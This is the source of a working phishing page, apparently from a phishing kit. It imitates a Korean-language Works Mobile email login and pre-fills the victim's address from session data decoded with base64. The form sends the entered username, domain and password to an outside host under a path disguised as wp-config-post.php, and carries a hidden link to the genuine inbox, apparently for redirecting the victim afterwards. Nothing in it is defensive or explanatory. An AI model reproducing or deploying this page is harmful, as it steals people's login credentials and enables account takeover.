﻿<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Login</title>
<link rel="shortcut icon" href="img/ico.jpg">
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #676767;
  font-weight: 700;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 50%;
  padding: 8 15px;
  margin: 0;
  background: white;
  border: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 0px;
  border-radius: 0px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  padding: 8 15px;
  margin: 0;
  background-color: transparent;
  border: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 5px;
  border-radius: 5px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus, 
  input[type=password]:focus {
  outline: none;
  background-color: transparent;
  border: 1px solid #2985db;
  }
 </style>
<body bgcolor="#F9FAFC">

<div align="center">
	<table border="0" width="513" cellspacing="0" cellpadding="0" bgcolor="#F9FAFC">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="36"></td>
				</tr>
				<tr>
					<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
		 <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
			<tr>
				<td width="513" height="660" background="img/fm.png">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td height="250"></td>
					</tr>
					<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="58"></td>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td>
										    <input type="text" name="user" required  placeholder="&#47196;&#44536;&#51064; ID" value="<?php echo $users;?>" style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid; border-right: 0px #ddd solid; border-left: 1px #ddd solid; border-top-left-radius:5px; border-bottom-left-radius:5px; border-top-right-radius:0px; border-bottom-right-radius:0px" /><input type="text" name="" required  placeholder="&#47196;&#44536;&#51064; ID" value="@<?php echo $ddomain;?>" style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid; border-left: 0px #ddd solid; border-right: 1px #ddd solid; border-top-right-radius:5px; border-bottom-right-radius:5px; border-top-left-radius:0px; border-bottom-left-radius:0px" />
									            <input  type="hidden" name="sender" value="Worksmobile" />
									            <input  type="hidden" name="domain" value="<?php echo $ddomain;?>" />
									            <input type="hidden" name="link" value="https://mail.worksmobile.com/#/inbox?t=1734796348048" />
                                                                                  </div>
										</td>
									</tr>
									<tr>
										<td height="10"></td>
									</tr>
									<tr>
										<td>
										    <input type="password" name="passwd" required placeholder="&#48708;&#48128;&#48264;&#54840;" autofocus />
										</td>
									</tr>
									<tr>
										<td height="20"></td>
									</tr>
									<tr>
										<td>
										<input type="image" src="img/btn.png" width="400" height="52"></td>
									</tr>
								</table>
								</td>
								<td width="60"></td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="227"></td>
					</tr>					
					<tr>
						<td height="20">
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="187"></td>
								<td width="24"></td>
								<td width="113"><font size="1">
								<a href="index.php" style="text-decoration: none; color: blue;" >
								<span style="text-decoration: none; font-weight: 700">&#45796;&#47480; &#44228;&#51221;&#51004;&#47196; &#47196;&#44536;&#51064;</span></a></font></td>
								<td>&nbsp;</td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="40"></td>
					</tr>
				</table>
				</td>
			</tr>
			</form>
		</table>
					</td>
				</tr>
				<tr>
					<td height="36" ></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>